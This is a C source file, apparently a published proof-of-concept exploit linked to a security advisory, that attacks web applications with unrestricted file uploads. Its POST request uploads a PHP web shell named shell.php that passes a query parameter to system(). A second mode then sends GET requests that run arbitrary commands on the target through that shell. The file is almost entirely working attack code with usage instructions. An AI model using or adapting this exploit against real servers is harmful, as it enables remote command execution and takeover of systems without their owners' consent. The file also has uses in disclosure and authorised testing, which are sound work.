/*generic exploit file upload vulnerabilities to install a shell.*/
/*http://www.vapidlabs.com/advisory.php?v=204*/
/*Larry W. Cashdollar @_larry0*/

#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define BSIZE 1024
#define DEBUG 1
#define TESTONLY 0

void get_request (char *p, char *path, char *arg, char *ar1);
void post_request (char *p, char *path, char *arg, char *ar1);
int read_socket (int sock, int total);

int
main (int argc, char *argv[])
{
  int sock = 0, total = 0;
  struct sockaddr_in serv_addr;
  char payload[BSIZE] = { 0 };


  if (argc <= 1)
    {
      printf
	("Generic File Upload Exploit\n@_larry0\n\n\nUsage: %s hostname port path command\nE.g.\n%s www.example.com 80 /web/php/upload.php to push a shell file\n%s www.example.com 80 /web/php/uploads whoami to exploit it.\n\n",argv[0],argv[0], argv[0]);
      return (0);
    }
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      printf ("\nSocket creation error\n");
      return (-1);
    }

  if (argc == 5)
    get_request (payload, argv[3], argv[1], argv[4]);
  else
    post_request (payload, argv[3], argv[1], argv[4]);

  if (!TESTONLY)
    {

      memset (&serv_addr, 0, sizeof (serv_addr));

      serv_addr.sin_family = AF_INET;
      serv_addr.sin_port = htons (atoi (argv[2]));

      if (inet_pton (AF_INET, argv[1], &serv_addr.sin_addr) <= 0)
	{
	  printf ("\nInvalid address.\n");
	  return (-1);
	}

      if (connect (sock, (struct sockaddr *) &serv_addr, sizeof (serv_addr)) <
	  0)
	{
	  printf ("\nConnection Failed.\n");
	  return (-1);
	}
      send (sock, payload, strlen (payload), 0);
    }
  if (DEBUG)
    printf ("\nSending Payload:\n%s", payload);
  if (!TESTONLY)
    {

      printf ("\n[+] Total bytes read: %d\n", read_socket (sock, total));
      close (sock);
    }
  return (0);
}

void
get_request (char *p, char *path, char *arg, char *ar1)
{
  snprintf (p, BSIZE,
	    "GET /%s/shell.php?cmd=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: File Upload exploit/9.22.0\r\nAccept: */*\r\n\r\n",
	    path, ar1, arg);
}

void
post_request (char *p, char *path, char *arg, char *ar1)
{
  snprintf (p, BSIZE,
	    "POST /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: File Upload exploit/9.22.0\r\nAccept: */*\r\nContent-Length: 244\r\nContent-Type: multipart/form-data; boundary=------------------------c8e05c8871143853\r\n\r\n--------------------------c8e05c8871143853\r\nContent-Disposition: form-data; name=\"files\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php $cmd=$_GET['cmd']; system($cmd);?>\r\n\r\n--------------------------c8e05c8871143853--\r\n\r\n",
	    path, arg);
}

int
read_socket (int sock, int total)
{
  char buffer[BSIZE] = { 0 };
  int bytes_read = 0;
  while (1)
    {
      bytes_read = recv (sock, buffer, BSIZE, 0);
      total += bytes_read;
      if (bytes_read <= 0)
	break;
      printf ("%s", buffer);
      bzero (buffer, BSIZE);
    }
  return (total);
}
